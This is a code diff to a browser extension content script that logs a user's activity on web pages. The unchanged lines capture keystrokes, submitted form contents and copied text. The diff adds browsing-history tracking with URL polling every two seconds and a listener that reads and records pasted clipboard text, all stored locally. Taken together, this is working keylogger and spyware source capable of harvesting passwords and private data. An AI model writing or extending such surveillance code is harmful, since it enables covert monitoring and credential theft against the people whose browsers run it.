@@ -11,6 +11,7 @@ const getDate = () => {
 const saveData = (value) => {
 
   localLog += value;
+  let webKey = currentDate + "@" + currentLocation;
 
   let obj = { };
   obj[webKey] = localLog;
@@ -19,32 +20,50 @@ const saveData = (value) => {
 
 };
 
-const currentDate = getDate();
-const currentLocation = window.location.href;
-const webKey = currentDate + "@" + currentLocation;
+const webLog = () => {
+  browser.storage.local.get("places").then(res => {
 
-const currentPage = {
-  url: currentLocation,
-  accessedOn: currentDate,
-  title: document.title
+    const currentPage = {
+      url: currentLocation,
+      accessedOn: currentDate,
+      title: document.title
+    };
+  
+    if (res.places) {
+  
+      let places = res.places;
+  
+      places.push(currentPage);
+      browser.storage.local.set({ "places": places });
+  
+    } else {
+  
+      browser.storage.local.set({ "places": [currentPage] });
+  
+    }
+  
+  });
 };
 
-browser.storage.local.get("places").then(res => {
+// INITIALIZE
 
-  if (res.places) {
+webLog();
 
-    let places = res.places;
+const currentDate = getDate();
+let currentLocation = window.location.href;
 
-    places.push(currentPage);
-    browser.storage.local.set({ "places": places });
+setInterval(() => {
 
-  } else {
+  if (currentLocation != window.location.href) {
 
-    browser.storage.local.set({ "places": [currentPage] });
+    currentLocation = window.location.href;
+    webLog();
 
   }
 
-});
+}, 2000);
+
+// END
 
 const getForms = () => {
 
@@ -67,7 +86,7 @@ const getForms = () => {
 
   }
 
-  saveData("\n[FORM SUBMITTED]:-------------------------\n"+raw+"\n-------------------------\n");
+  saveData("\n[FORM SUBMITTED]:-------------------------\n"+raw+"-------------------------\n");
 };
 
 document.addEventListener("keyup", (e) => {
@@ -97,6 +116,18 @@ document.addEventListener('copy', () => {
   promise.then(x => {
 
     saveData("\n[COPIED]:-------------------------\n"+x+"\n-------------------------\n");
+
+  });
+
+});
+
+document.addEventListener('paste', () => {
+
+  let promise = navigator.clipboard.readText();
+
+  promise.then(x => {
+
+    saveData("\n[PASTED]:-------------------------\n"+x+"\n-------------------------\n");
 
   });
 
